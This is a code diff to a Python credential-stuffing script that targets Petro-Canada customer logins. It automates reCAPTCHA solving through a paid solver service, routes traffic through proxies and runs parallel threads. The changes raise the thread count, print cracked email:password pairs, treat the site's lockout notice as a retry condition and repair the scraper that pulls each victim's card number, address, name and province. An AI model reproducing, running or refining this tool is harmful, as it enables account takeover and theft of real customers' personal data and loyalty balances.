@@ -17,7 +17,7 @@ urllib3.disable_warnings()
 class petro:
     def __init__(self):
         self.captchaSolver = recaptchaV3Proxyless()
-        self.captchaSolver.set_verbose(1)
+        self.captchaSolver.set_verbose(0)
         self.captchaSolver.set_key(open(dataTracker.apiKeyFile, 'r').read().strip().rstrip())
         self.captchaSolver.set_website_url('https://www.petro-canada.ca/en/personal?modalUrl=%2Fen%2Fpersonal%2Flogin')
         self.captchaSolver.set_website_key('6LeuGYEjAAAAAOaPqAckgwRGjH2G09CFkxca7VkB')
@@ -73,10 +73,10 @@ class petro:
                         json=self.json_data,
                     )
 
-                    warning(self.loginResponse.text)
-                    warning(self.captchaCode)
+                    #warning(self.loginResponse.text)
+                    #warning(self.captchaCode)
 
-                    if 'invalid.recaptcha' in self.loginResponse.text:
+                    if 'invalid.recaptcha' in self.loginResponse.text or 'Sorry, the login function has been disabled for 180 minutes.' in self.loginResponse.text:
                         warning('captcha error')
                         self.captchaSolver.report_incorrect_recaptcha()
                         self.logCounts()
@@ -91,7 +91,7 @@ class petro:
                         break
 
                     if '"RedirectUrl":"/en/personal/my-petro-points"' in self.loginResponse.text:
-                        warning('success')
+                        warning(f'success:{self.email}:{self.password}')
                         self.captchaSolver.report_correct_recaptcha()
                         self.getDetails()
                         dataTracker.validAttempts += 1
@@ -118,7 +118,7 @@ class petro:
 
         self.detailsText = self.details.text
 
-        self.petroCard = self.detailsText.split('<span class="visitor-dZropdown__card-number" data-hj-suppress>')[1].split('</span>')[0].strip().rstrip().replace(' ', '')
+        self.petroCard = self.detailsText.split('<span class="visitor-dropdown__card-number" data-hj-suppress>')[1].split('</span>')[0].strip().rstrip().replace(' ', '')
         self.petroAddress = self.detailsText.split('<div class="visitor-dropdown__street-address" data-hj-suppress>')[1].split('</div>')[0].strip().rstrip()
         self.petroName = self.detailsText.split('<div class="visitor-dropdown__full-name" data-hj-suppress>')[1].split('</div>')[0].strip().rstrip().replace('\n', '').replace(' ', '').replace('\r\n', '').replace('    ', '').replace('\n\n', '').split('\n')[0].replace('\r\r', ' ').replace('	', '')
         self.petroProvince = self.detailsText.split('<div class="visitor-dropdown__region" data-hj-suppress>')[1].split('</div>')[0].strip().rstrip()
@@ -134,6 +134,7 @@ class petro:
             'http': self.proxies,
             'https': self.proxies
         }
+        warning(self.proxyDict)
         self.session.proxies.update(self.proxyDict)
 
     def logCounts(self):
@@ -211,7 +212,7 @@ class data:
         self.validAttempts = 0
         self.realLogins = 0
         self.wrongCaptchas = 0
-        self.threads = 15
+        self.threads = 25
 
 
 class pws:
